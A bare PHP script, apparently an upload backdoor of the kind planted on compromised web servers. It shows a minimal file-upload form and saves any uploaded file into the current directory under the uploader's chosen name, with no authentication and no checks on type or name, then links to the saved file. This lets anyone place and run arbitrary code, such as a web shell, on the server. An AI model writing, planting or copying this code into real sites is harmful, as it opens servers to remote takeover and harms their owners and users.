<?php 
if (isset($_POST['up']))
{
    $dir = "";
    $usrfile = $_FILES['sc']['name'];
    $usrtmp = $_FILES['sc']['tmp_name'];
    if (isset($_FILES['sc']['name']))
    {
    	$zby = $dir.$usrfile;
    	
    	move_uploaded_file($usrtmp,$zby);
    	echo "<a href=$usrfile> $usrfile </a>";
    }

}
else 
{
	echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="sc"><input type="Submit" name="up" ></form>';
}

?>
